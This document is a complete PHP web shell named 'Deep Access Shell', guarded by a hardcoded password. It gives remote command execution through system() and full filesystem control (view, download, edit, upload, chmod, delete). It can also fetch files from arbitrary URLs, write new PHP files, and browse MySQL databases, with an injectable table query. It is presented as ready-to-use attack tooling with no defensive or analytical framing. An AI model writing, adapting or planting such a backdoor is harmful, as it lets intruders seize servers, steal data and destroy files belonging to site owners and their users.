<?php
// deep_shell_fixed.php
error_reporting(0);
set_time_limit(0);

// Password: admin123
session_start();
if(!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    if(isset($_POST['pass']) && $_POST['pass'] === 'admin123') {
        $_SESSION['auth'] = true;
        header("Refresh:0");
        exit;
    }
    echo '<form method="post" style="padding:20px;">
            <input type="password" name="pass" placeholder="Password">
            <input type="submit" value="Login">
          </form>';
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Deep Shell Access - Fixed</title>
    <style>
        body { font-family: Consolas, monospace; background: #0a0a0a; color: #00ff00; }
        pre { background: #111; padding: 10px; border-left: 3px solid #00ff00; }
        .tab { display: none; }
        .active { display: block; }
        input, select, textarea { 
            background: #222; color: #00ff00; border: 1px solid #00ff00; 
            padding: 8px; margin: 5px;
        }
        button { 
            background: #003300; color: #00ff00; border: 1px solid #00ff00; 
            padding: 8px 15px; cursor: pointer; margin: 5px;
        }
        .danger { background: #330000; }
        .success { background: #003300; }
        .file-item { 
            background: #111; margin: 5px; padding: 10px; 
            border: 1px solid #333; border-radius: 3px;
        }
        .file-actions { margin-left: 20px; margin-top: 5px; }
        .file-actions a, .file-actions button { 
            color: #00ff00; text-decoration: none; margin: 0 5px;
            padding: 3px 10px; border: 1px solid #00ff00; border-radius: 3px;
            background: #222; cursor: pointer; font-size: 12px;
        }
        .file-actions a:hover, .file-actions button:hover { background: #003300; }
        .dir { color: #00aaff; }
        .file { color: #00ff00; }
        .size { color: #ffff00; }
        .message { 
            padding: 10px; margin: 10px 0; border-radius: 3px;
            background: #003300; border: 1px solid #00ff00;
        }
        .error { background: #330000; border: 1px solid #ff0000; }
        .toolbar { background: #111; padding: 10px; margin: 10px 0; border-radius: 3px; }
    </style>
</head>
<body>
    <h2>🔓 Deep Access Shell - Fixed Operations</h2>
    
    <div style="margin-bottom:20px;">
        <button onclick="showTab('terminal')">Terminal</button>
        <button onclick="showTab('files')">📁 File Manager</button>
        <button onclick="showTab('upload')">⬆ Upload Files</button>
        <button onclick="showTab('create')">➕ Create New</button>
        <button onclick="showTab('db')">🗄️ Database</button>
    </div>

    <!-- FILE MANAGER TAB -->
    <div id="files" class="tab active">
        <h3>📁 File System Explorer</h3>
        
        <?php
        // Handle operations via POST (not GET)
        $current_path = isset($_POST['current_path']) ? $_POST['current_path'] : '.';
        if(!is_dir($current_path)) $current_path = '.';
        $real_path = realpath($current_path);
        
        // Process DELETE operation
        if(isset($_POST['delete_file'])) {
            $file_to_delete = $_POST['delete_file'];
            if(file_exists($file_to_delete)) {
                if(is_dir($file_to_delete)) {
                    if(deleteDirectory($file_to_delete)) {
                        echo '<div class="message">✓ Directory deleted: ' . htmlspecialchars($file_to_delete) . '</div>';
                    } else {
                        echo '<div class="message error">✗ Failed to delete directory: ' . htmlspecialchars($file_to_delete) . '</div>';
                    }
                } else {
                    if(unlink($file_to_delete)) {
                        echo '<div class="message">✓ File deleted: ' . htmlspecialchars($file_to_delete) . '</div>';
                    } else {
                        echo '<div class="message error">✗ Failed to delete file: ' . htmlspecialchars($file_to_delete) . '</div>';
                    }
                }
            }
        }
        
        // Process RENAME operation
        if(isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
            $old_name = $_POST['rename_old'];
            $new_name = $_POST['rename_new'];
            if(file_exists($old_name) && rename($old_name, $new_name)) {
                echo '<div class="message">✓ Renamed: ' . htmlspecialchars(basename($old_name)) . ' → ' . htmlspecialchars(basename($new_name)) . '</div>';
            } else {
                echo '<div class="message error">✗ Failed to rename</div>';
            }
        }
        
        // Process CHMOD operation
        if(isset($_POST['chmod_file']) && isset($_POST['chmod_mode'])) {
            $file = $_POST['chmod_file'];
            $mode = $_POST['chmod_mode'];
            if(file_exists($file) && chmod($file, octdec($mode))) {
                echo '<div class="message">✓ Permissions changed: ' . htmlspecialchars($file) . ' → ' . $mode . '</div>';
            } else {
                echo '<div class="message error">✗ Failed to change permissions</div>';
            }
        }
        
        // Process CREATE DIRECTORY operation
        if(isset($_POST['create_dir_name'])) {
            $new_dir = $current_path . '/' . $_POST['create_dir_name'];
            if(!file_exists($new_dir) && mkdir($new_dir, 0755, true)) {
                echo '<div class="message">✓ Directory created: ' . htmlspecialchars($_POST['create_dir_name']) . '</div>';
            } else {
                echo '<div class="message error">✗ Failed to create directory</div>';
            }
        }
        
        // Process CREATE FILE operation
        if(isset($_POST['create_file_name'])) {
            $new_file = $current_path . '/' . $_POST['create_file_name'];
            $content = $_POST['create_file_content'] ?? '';
            if(!file_exists($new_file) && file_put_contents($new_file, $content)) {
                echo '<div class="message">✓ File created: ' . htmlspecialchars($_POST['create_file_name']) . '</div>';
            } else {
                echo '<div class="message error">✗ Failed to create file</div>';
            }
        }
        
        // Display current path
        echo '<div class="toolbar">';
        echo '<strong>Current Path:</strong> ' . htmlspecialchars($real_path);
        echo ' <span style="color:#ffff00;">(Free: ' . format_size(disk_free_space($real_path)) . ')</span>';
        echo '</div>';
        
        // Navigation
        echo '<div class="toolbar">';
        echo '<form method="post" style="display:inline;">';
        echo '<input type="hidden" name="current_path" value="' . htmlspecialchars(dirname($current_path)) . '">';
        echo '<button type="submit">⬆ Parent Directory</button>';
        echo '</form>';
        
        echo '<form method="post" style="display:inline;margin-left:10px;">';
        echo '<input type="text" name="current_path" value="' . htmlspecialchars($current_path) . '" style="width:300px">';
        echo '<button type="submit">Go</button>';
        echo '</form>';
        echo '</div>';
        
        // Create Directory Form
        echo '<div class="toolbar">';
        echo '<strong>Create New:</strong>';
        echo '<form method="post" style="display:inline;margin-left:10px;">';
        echo '<input type="hidden" name="current_path" value="' . htmlspecialchars($current_path) . '">';
        echo '<input type="text" name="create_dir_name" placeholder="Directory name" required>';
        echo '<button type="submit">Create Directory</button>';
        echo '</form>';
        echo '</div>';
        
        // List files and directories
        echo '<h4>Contents:</h4>';
        if(is_dir($current_path)) {
            $items = scandir($current_path);
            $files = [];
            $dirs = [];
            
            foreach($items as $item) {
                if($item == '.' || $item == '..') continue;
                $full_path = $current_path . '/' . $item;
                if(is_dir($full_path)) {
                    $dirs[] = $item;
                } else {
                    $files[] = $item;
                }
            }
            
            // Sort
            sort($dirs);
            sort($files);
            
            // Display directories
            foreach($dirs as $dir) {
                $full_path = $current_path . '/' . $dir;
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);
                $modified = date('Y-m-d H:i:s', filemtime($full_path));
                
                echo '<div class="file-item">';
                echo '📁 <span class="dir">' . htmlspecialchars($dir) . '</span>';
                echo ' <small>(Permissions: ' . $perms . ', Modified: ' . $modified . ')</small>';
                
                echo '<div class="file-actions">';
                // Open
                echo '<form method="post" style="display:inline;">';
                echo '<input type="hidden" name="current_path" value="' . htmlspecialchars($full_path) . '">';
                echo '<button type="submit">Open</button>';
                echo '</form>';
                
                // Rename
                echo '<button onclick="showRenameForm(\'' . htmlspecialchars($full_path) . '\', \'' . htmlspecialchars($dir) . '\')">Rename</button>';
                
                // Chmod
                echo '<button onclick="showChmodForm(\'' . htmlspecialchars($full_path) . '\', \'' . $perms . '\')">Chmod</button>';
                
                // Delete
                echo '<form method="post" style="display:inline;" onsubmit="return confirm(\'Delete directory ' . htmlspecialchars($dir) . '?\')">';
                echo '<input type="hidden" name="current_path" value="' . htmlspecialchars($current_path) . '">';
                echo '<input type="hidden" name="delete_file" value="' . htmlspecialchars($full_path) . '">';
                echo '<button type="submit" style="color:#ff0000;">Delete</button>';
                echo '</form>';
                
                echo '</div>';
                echo '</div>';
            }
            
            // Display files
            foreach($files as $file) {
                $full_path = $current_path . '/' . $file;
                $size = filesize($full_path);
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);
                $modified = date('Y-m-d H:i:s', filemtime($full_path));
                
                echo '<div class="file-item">';
                echo '📄 <span class="file">' . htmlspecialchars($file) . '</span>';
                echo ' <span class="size">(' . format_size($size) . ')</span>';
                echo ' <small>(Permissions: ' . $perms . ', Modified: ' . $modified . ')</small>';
                
                echo '<div class="file-actions">';
                // Download
                echo '<a href="?download=' . urlencode($full_path) . '">Download</a>';
                
                // View
                echo '<a href="?view=' . urlencode($full_path) . '">View</a>';
                
                // Edit
                echo '<a href="?edit=' . urlencode($full_path) . '">Edit</a>';
                
                // Rename
                echo '<button onclick="showRenameForm(\'' . htmlspecialchars($full_path) . '\', \'' . htmlspecialchars($file) . '\')">Rename</button>';
                
                // Chmod
                echo '<button onclick="showChmodForm(\'' . htmlspecialchars($full_path) . '\', \'' . $perms . '\')">Chmod</button>';
                
                // Delete
                echo '<form method="post" style="display:inline;" onsubmit="return confirm(\'Delete file ' . htmlspecialchars($file) . '?\')">';
                echo '<input type="hidden" name="current_path" value="' . htmlspecialchars($current_path) . '">';
                echo '<input type="hidden" name="delete_file" value="' . htmlspecialchars($full_path) . '">';
                echo '<button type="submit" style="color:#ff0000;">Delete</button>';
                echo '</form>';
                
                echo '</div>';
                echo '</div>';
            }
            
            // Display empty message
            if(empty($dirs) && empty($files)) {
                echo '<div class="message">Directory is empty</div>';
            }
        }
        
        // Handle file download
        if(isset($_GET['download'])) {
            $file = $_GET['download'];
            if(file_exists($file) && !is_dir($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                header('Content-Length: ' . filesize($file));
                readfile($file);
                exit;
            }
        }
        
        // Handle file view
        if(isset($_GET['view'])) {
            $file = $_GET['view'];
            if(file_exists($file) && !is_dir($file)) {
                echo '<hr><h4>📄 Viewing: ' . htmlspecialchars($file) . '</h4>';
                echo '<pre style="max-height:500px;overflow:auto;">';
                $content = @file_get_contents($file);
                echo htmlspecialchars($content);
                echo '</pre>';
                echo '<a href="?"><button>Back</button></a>';
            }
        }
        
        // Handle file edit
        if(isset($_GET['edit'])) {
            $file = $_GET['edit'];
            if(file_exists($file) && !is_dir($file)) {
                echo '<hr><h4>✏️ Editing: ' . htmlspecialchars($file) . '</h4>';
                $content = htmlspecialchars(@file_get_contents($file));
                echo '<form method="post">';
                echo '<input type="hidden" name="current_path" value="' . htmlspecialchars(dirname($file)) . '">';
                echo '<textarea name="edit_content" rows="20" style="width:100%;font-family:monospace;">' . $content . '</textarea><br>';
                echo '<input type="hidden" name="edit_file" value="' . htmlspecialchars($file) . '">';
                echo '<button type="submit">Save</button>';
                echo '<a href="?"><button type="button">Cancel</button></a>';
                echo '</form>';
                
                if(isset($_POST['edit_file']) && $_POST['edit_file'] == $file) {
                    if(file_put_contents($file, $_POST['edit_content'])) {
                        echo '<script>alert("File saved!"); window.location="?";</script>';
                    }
                }
            }
        }
        ?>
        
        <!-- Rename Form (hidden) -->
        <div id="renameForm" style="display:none;margin:20px 0;padding:20px;background:#222;border-radius:5px;">
            <h4>Rename File/Directory</h4>
            <form method="post">
                <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_path); ?>">
                <input type="hidden" id="rename_old" name="rename_old" value="">
                New Name: <input type="text" id="rename_new" name="rename_new" required style="width:300px"><br><br>
                <button type="submit">Rename</button>
                <button type="button" onclick="document.getElementById('renameForm').style.display='none'">Cancel</button>
            </form>
        </div>
        
        <!-- Chmod Form (hidden) -->
        <div id="chmodForm" style="display:none;margin:20px 0;padding:20px;background:#222;border-radius:5px;">
            <h4>Change Permissions</h4>
            <form method="post">
                <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_path); ?>">
                <input type="hidden" id="chmod_file" name="chmod_file" value="">
                Permissions: <input type="text" id="chmod_mode" name="chmod_mode" value="0644" style="width:100px">
                <small>(e.g., 0644, 0755, 0777)</small><br><br>
                <button type="submit">Change</button>
                <button type="button" onclick="document.getElementById('chmodForm').style.display='none'">Cancel</button>
            </form>
        </div>
    </div>

    <!-- UPLOAD TAB -->
    <div id="upload" class="tab">
        <h3>⬆ Upload Files</h3>
        
        <?php
        // Handle file upload
        if(isset($_FILES['file_upload'])) {
            $upload_path = isset($_POST['upload_path']) ? $_POST['upload_path'] : $current_path;
            if(!is_dir($upload_path)) $upload_path = $current_path;
            
            $file = $_FILES['file_upload'];
            $target_file = $upload_path . '/' . basename($file['name']);
            
            if(move_uploaded_file($file['tmp_name'], $target_file)) {
                echo '<div class="message">✓ File uploaded: ' . htmlspecialchars($file['name']) . '</div>';
            } else {
                echo '<div class="message error">✗ Failed to upload file</div>';
            }
        }
        
        // Handle multiple file upload
        if(isset($_FILES['files_upload'])) {
            $upload_path = isset($_POST['upload_path']) ? $_POST['upload_path'] : $current_path;
            if(!is_dir($upload_path)) $upload_path = $current_path;
            
            $files = $_FILES['files_upload'];
            $success = 0;
            $failed = 0;
            
            for($i = 0; $i < count($files['name']); $i++) {
                if($files['error'][$i] === UPLOAD_ERR_OK) {
                    $target_file = $upload_path . '/' . basename($files['name'][$i]);
                    if(move_uploaded_file($files['tmp_name'][$i], $target_file)) {
                        $success++;
                    } else {
                        $failed++;
                    }
                }
            }
            
            echo '<div class="message">✓ Uploaded: ' . $success . ' files, Failed: ' . $failed . ' files</div>';
        }
        ?>
        
        <div class="toolbar">
            <h4>Single File Upload</h4>
            <form method="post" enctype="multipart/form-data">
                <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_path); ?>">
                <p>Upload to: <input type="text" name="upload_path" value="<?php echo htmlspecialchars($current_path); ?>" style="width:400px"></p>
                <p><input type="file" name="file_upload"></p>
                <button type="submit">Upload File</button>
            </form>
        </div>
        
        <div class="toolbar">
            <h4>Multiple Files Upload</h4>
            <form method="post" enctype="multipart/form-data">
                <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_path); ?>">
                <p>Upload to: <input type="text" name="upload_path" value="<?php echo htmlspecialchars($current_path); ?>" style="width:400px"></p>
                <p><input type="file" name="files_upload[]" multiple></p>
                <button type="submit">Upload Files</button>
            </form>
        </div>
        
        <div class="toolbar">
            <h4>Upload from URL</h4>
            <form method="post">
                <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_path); ?>">
                <p>URL: <input type="text" name="file_url" placeholder="https://example.com/file.zip" style="width:400px"></p>
                <p>Save as: <input type="text" name="save_as" placeholder="filename.ext" style="width:300px"></p>
                <button type="submit" name="download_url">Download & Save</button>
            </form>
            
            <?php
            if(isset($_POST['download_url']) && isset($_POST['file_url'])) {
                $url = $_POST['file_url'];
                $save_as = $_POST['save_as'] ?: basename($url);
                $save_path = $current_path . '/' . $save_as;
                
                if($content = @file_get_contents($url)) {
                    if(file_put_contents($save_path, $content)) {
                        echo '<div class="message">✓ Downloaded: ' . htmlspecialchars($save_as) . '</div>';
                    } else {
                        echo '<div class="message error">✗ Failed to save file</div>';
                    }
                } else {
                    echo '<div class="message error">✗ Failed to download from URL</div>';
                }
            }
            ?>
        </div>
    </div>

    <!-- CREATE NEW TAB -->
    <div id="create" class="tab">
        <h3>➕ Create New</h3>
        
        <div class="toolbar">
            <h4>Create New Directory</h4>
            <form method="post">
                <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_path); ?>">
                <p>Directory Name: <input type="text" name="create_dir_name" placeholder="new_directory" required style="width:300px"></p>
                <p>Create in: <input type="text" name="create_dir_path" value="<?php echo htmlspecialchars($current_path); ?>" style="width:400px"></p>
                <button type="submit">Create Directory</button>
            </form>
        </div>
        
        <div class="toolbar">
            <h4>Create New File</h4>
            <form method="post">
                <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_path); ?>">
                <p>File Name: <input type="text" name="create_file_name" placeholder="newfile.txt" required style="width:300px"></p>
                <p>Create in: <input type="text" name="create_file_path" value="<?php echo htmlspecialchars($current_path); ?>" style="width:400px"></p>
                <p>File Content:</p>
                <textarea name="create_file_content" rows="10" style="width:100%" placeholder="Enter file content here..."></textarea><br>
                <button type="submit">Create File</button>
            </form>
        </div>
        
        <div class="toolbar">
            <h4>Create PHP File</h4>
            <form method="post">
                <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_path); ?>">
                <p>File Name: <input type="text" name="create_php_name" placeholder="script.php" required style="width:300px"></p>
                <p>PHP Code:</p>
                <textarea name="create_php_content" rows="10" style="width:100%;font-family:monospace;">&lt;?php
// Your PHP code here
echo "Hello World!";
?&gt;</textarea><br>
                <button type="submit">Create PHP File</button>
            </form>
            
            <?php
            if(isset($_POST['create_php_name'])) {
                $php_file = $current_path . '/' . $_POST['create_php_name'];
                $php_content = $_POST['create_php_content'] ?? '<?php echo "Hello World!"; ?>';
                if(!file_exists($php_file) && file_put_contents($php_file, $php_content)) {
                    echo '<div class="message">✓ PHP file created: ' . htmlspecialchars($_POST['create_php_name']) . '</div>';
                } else {
                    echo '<div class="message error">✗ Failed to create PHP file</div>';
                }
            }
            ?>
        </div>
        
        <div class="toolbar">
            <h4>Create HTML File</h4>
            <form method="post">
                <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_path); ?>">
                <p>File Name: <input type="text" name="create_html_name" placeholder="page.html" required style="width:300px"></p>
                <p>HTML Content:</p>
                <textarea name="create_html_content" rows="10" style="width:100%;font-family:monospace;">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;New Page&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Hello World!&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;</textarea><br>
                <button type="submit">Create HTML File</button>
            </form>
        </div>
    </div>

    <!-- TERMINAL TAB -->
    <div id="terminal" class="tab">
        <h3>Terminal Access</h3>
        <form method="post">
            <input type="text" name="cmd" placeholder="Enter command" style="width:500px" value="<?php echo $_POST['cmd'] ?? ''; ?>">
            <select name="shell">
                <option value="/bin/bash">bash</option>
                <option value="/bin/sh">sh</option>
                <option value="cmd">cmd (Windows)</option>
            </select>
            <button type="submit">Execute</button>
        </form>
        
        <?php
        if(isset($_POST['cmd'])) {
            echo "<pre>";
            $cmd = $_POST['cmd'];
            $shell = $_POST['shell'] ?? '/bin/bash';
            
            if($shell === 'cmd') {
                // Windows
                system($cmd . " 2>&1");
            } else {
                // Linux/Unix
                system("$shell -c \"" . escapeshellcmd($cmd) . "\" 2>&1");
            }
            echo "</pre>";
        }
        ?>
    </div>

    <!-- DATABASE TAB -->
    <div id="db" class="tab">
        <h3>🗄️ Database Access</h3>
        <form method="post">
            <input type="text" name="db_host" placeholder="Host" value="localhost" style="width:150px">
            <input type="text" name="db_user" placeholder="Username" value="root" style="width:150px">
            <input type="password" name="db_pass" placeholder="Password" style="width:150px">
            <input type="text" name="db_name" placeholder="Database" style="width:150px">
            <button type="submit" name="db_connect">Connect</button>
        </form>
        
        <?php
        if(isset($_POST['db_connect'])) {
            $host = $_POST['db_host'];
            $user = $_POST['db_user'];
            $pass = $_POST['db_pass'];
            $name = $_POST['db_name'];
            
            try {
                $pdo = new PDO("mysql:host=$host;dbname=$name", $user, $pass);
                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                
                echo '<div class="message">✓ Connected to database: ' . htmlspecialchars($name) . '</div>';
                
                // Show tables
                $tables = $pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
                
                echo '<h4>Tables:</h4>';
                foreach($tables as $table) {
                    echo '<button onclick="showTableData(\'' . htmlspecialchars($table) . '\')">' . htmlspecialchars($table) . '</button> ';
                }
                
                echo '<div id="tableData"></div>';
                
            } catch(Exception $e) {
                echo '<div class="message error">✗ Database Error: ' . htmlspecialchars($e->getMessage()) . '</div>';
            }
        }
        ?>
    </div>

    <script>
    function showTab(tabName) {
        // Hide all tabs
        var tabs = document.getElementsByClassName('tab');
        for(var i = 0; i < tabs.length; i++) {
            tabs[i].className = 'tab';
        }
        // Show selected tab
        document.getElementById(tabName).className = 'tab active';
    }
    
    function showRenameForm(oldPath, oldName) {
        document.getElementById('rename_old').value = oldPath;
        document.getElementById('rename_new').value = oldName;
        document.getElementById('renameForm').style.display = 'block';
    }
    
    function showChmodForm(filePath, currentMode) {
        document.getElementById('chmod_file').value = filePath;
        document.getElementById('chmod_mode').value = currentMode;
        document.getElementById('chmodForm').style.display = 'block';
    }
    
    function showTableData(tableName) {
        // AJAX request to fetch table data
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if(xhr.readyState === 4 && xhr.status === 200) {
                document.getElementById('tableData').innerHTML = xhr.responseText;
            }
        };
        xhr.open('POST', '?get_table_data', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('table=' + encodeURIComponent(tableName));
    }
    </script>
</body>
</html>

<?php
// Helper functions
function format_size($bytes) {
    if($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif($bytes > 1) {
        return $bytes . ' bytes';
    } elseif($bytes == 1) {
        return '1 byte';
    } else {
        return '0 bytes';
    }
}

function deleteDirectory($dir) {
    if(!is_dir($dir)) return false;
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach($files as $file) {
        $path = $dir . '/' . $file;
        is_dir($path) ? deleteDirectory($path) : unlink($path);
    }
    return rmdir($dir);
}

// Handle AJAX table data request
if(isset($_POST['table'])) {
    try {
        $pdo = new PDO("mysql:host={$_POST['db_host']};dbname={$_POST['db_name']}", $_POST['db_user'], $_POST['db_pass']);
        $table = $_POST['table'];
        $data = $pdo->query("SELECT * FROM $table LIMIT 100")->fetchAll(PDO::FETCH_ASSOC);
        
        echo '<h4>Data from ' . htmlspecialchars($table) . ':</h4>';
        echo '<table border="1" cellpadding="5" style="width:100%">';
        if(!empty($data)) {
            echo '<tr>';
            foreach(array_keys($data[0]) as $col) {
                echo '<th>' . htmlspecialchars($col) . '</th>';
            }
            echo '</tr>';
            
            foreach($data as $row) {
                echo '<tr>';
                foreach($row as $cell) {
                    echo '<td>' . htmlspecialchars($cell) . '</td>';
                }
                echo '</tr>';
            }
        }
        echo '</table>';
    } catch(Exception $e) {
        echo 'Error: ' . $e->getMessage();
    }
    exit;
}
?>
